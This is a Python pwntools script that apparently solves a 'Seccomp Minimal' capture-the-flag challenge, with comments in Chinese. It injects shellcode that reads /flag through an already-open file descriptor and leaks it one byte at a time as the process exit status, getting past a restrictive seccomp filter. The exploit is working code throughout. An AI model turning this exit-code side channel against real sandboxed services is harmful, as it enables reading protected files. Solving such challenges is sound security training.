# Seccomp Minimal
import pwn
from dojotool import find_challenge, tee


def one_round(io: pwn.process, index: int) -> int:
    # within mmap page range
    buffer = 0x1337800

    sc = f"""
        /* read(3, buffer, index + 1) */
        mov rdi, 3
        mov rsi, {buffer}
        mov rdx, {index + 1}
        xor rax, rax
        syscall

        /* 如果读取长度不足，说明到达 EOF */
        cmp rax, {index + 1}
        jl finished

        /* exit(buffer[index]) */
        movzx rdi, byte ptr [{buffer + index}]
        mov rax, 60
        syscall

    finished:
        xor rdi, rdi
        mov rax, 60
        syscall
    """
    io.send(pwn.asm(sc))
    io.shutdown("send")
    io.recvrepeat()
    return io.poll()


def ctf() -> None:
    root_bin = find_challenge()
    flag = bytearray()

    for index in range(0x40):
        with pwn.process([root_bin, "/flag"], raw=True, level="error") as io:
            tee(io)
            value = one_round(io, index)

        # exit(0) 既可能表示 EOF，也可能是真正的 NUL
        # 对 flag 来说通常可以直接认为是 EOF
        if not value or value < 0:
            break

        flag.append(value)

        print(flag.decode(errors="replace"), flush=True)
        if value == ord("}"):
            break


if __name__ == "__main__":
    ctf()
